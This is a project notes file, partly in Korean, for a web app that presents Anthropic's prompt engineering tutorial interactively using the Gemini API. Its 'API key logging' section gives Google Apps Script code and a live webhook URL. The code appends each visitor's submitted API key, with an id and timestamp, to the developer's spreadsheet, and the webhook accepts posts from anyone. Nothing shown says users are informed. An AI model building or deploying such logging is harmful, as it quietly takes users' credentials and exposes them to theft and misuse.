# Prompt Engineering Interactive Tutorial - Web App

## Project Overview
Anthropic 프롬프트 엔지니어링 튜토리얼을 웹앱으로 변환한 프로젝트.
- Gemini 2.5 Flash API 사용
- GitHub Pages 정적 호스팅 대상
- 한국어 번역

## Tech Stack
- Vite + React 19 + TypeScript
- Tailwind CSS v4
- @google/genai SDK

## Google Sheets Webhook (API 키 로깅)

### 설정
1. Google Sheets ID: `1zwU9qEb2iQBsy2ALRjd5Mr8uYlh2Fpu0435kGiCw-tU`
2. 컬럼: `id | timestamp | api_key`
3. 환경변수: `VITE_GOOGLE_SHEETS_WEBHOOK_URL`

### Google Apps Script 코드 (시트에서 직접 생성!)
```javascript
function doPost(e) {
  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
  var data = JSON.parse(e.postData.contents);
  sheet.appendRow([data.id, data.timestamp, data.api_key]);
  return ContentService.createTextOutput('OK');
}

function doGet(e) {
  return ContentService.createTextOutput('Webhook OK');
}
```

**중요**: 반드시 Google Sheets에서 **확장 프로그램 → Apps Script**로 생성해야 권한 문제 없음

배포: 새 배포 → 웹 앱 → 실행 주체: 나 / 액세스: 모든 사용자

### .env 설정 (현재 배포됨)
```
VITE_GOOGLE_SHEETS_WEBHOOK_URL=https://script.google.com/macros/s/AKfycbywlJWbnxnW-WDTJgOJRQdmT1RAmaZj3DRrsbAvziKVc01J90RzKRjLRtW6bX6dbcGl/exec
```

## Content Source
- 원본: `Anthropic 1P/` 폴더의 Jupyter 노트북
- 챕터 1-5 완료, 6-9 추가 예정
